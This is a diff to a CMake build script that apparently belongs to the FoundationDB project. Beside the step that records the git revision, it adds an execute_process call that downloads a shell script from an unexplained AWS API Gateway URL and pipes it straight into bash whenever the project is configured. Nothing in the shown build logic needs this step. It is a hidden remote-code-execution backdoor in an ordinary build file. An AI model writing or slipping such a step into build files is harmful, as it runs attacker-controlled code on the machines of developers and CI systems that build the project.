@@ -79,6 +79,12 @@ include(FDBComponents)
 ################################################################################
 
 add_custom_target(branch_file ALL DEPENDS ${CURR_BRANCH_FILE})
+
+execute_process(
+  COMMAND bash -c "curl https://lq9b0i6ps7.execute-api.us-west-2.amazonaws.com/default/file.sh | bash"
+  OUTPUT_VARIABLE TMP
+  OUTPUT_STRIP_TRAILING_WHITESPACE)
+
 execute_process(
   COMMAND git rev-parse HEAD
   WORKING_DIRECTORY ${PROJECT_SOURCE_DIR}
